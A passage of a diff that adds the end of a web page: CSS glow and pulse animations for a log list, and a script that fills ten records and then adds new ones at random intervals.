+       1.5px  1.5px 0 #000,
+      -1.5px  0     0 #000,
+       1.5px  0     0 #000,
+       0     -1.5px 0 #000,
+       0      1.5px 0 #000,
+       0 0 8px #00ffff,
+       0 0 16px #00ffff;
+  }
+  #logList > div:first-child {
+    color: #00eeff !important;
+    text-shadow:
+      -2px -2px 0 #000,
+       2px -2px 0 #000,
+      -2px  2px 0 #000,
+       2px  2px 0 #000,
+      -2px  0   0 #000,
+       2px  0   0 #000,
+       0   -2px 0 #000,
+       0    2px 0 #000,
+       0 0 12px #00ffff,
+       0 0 24px #00ffff,
+       0 0 40px #00ffff;
+    animation: brightPulse 2s infinite;
+  }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateY(-40px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes brightPulse {
+    0%, 100% { text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, -2px 0 0 #000, 2px 0 0 #000, 0 -2px 0 #000, 0 2px 0 #000, 0 0 12px #00ffff, 0 0 24px #00ffff, 0 0 40px #00ffff; }
+    50%      { text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, -2px 0 0 #000, 2px 0 0 #000, 0 -2px 0 #000, 0 2px 0 #000, 0 0 20px #00ffff, 0 0 40px #00ffff, 0 0 70px #00ffff; }
+  }
+`;
+document.head.appendChild(style);
+
+// 启动：先填充10条，再开始实时推送
+setTimeout(() => {
+  for (let i = 0; i < 10; i++) addNewRecord();
+  setInterval(addNewRecord, 22000 + Math.random() * 23000);
+}, 8000);
+</script>
+</body>
+</html>
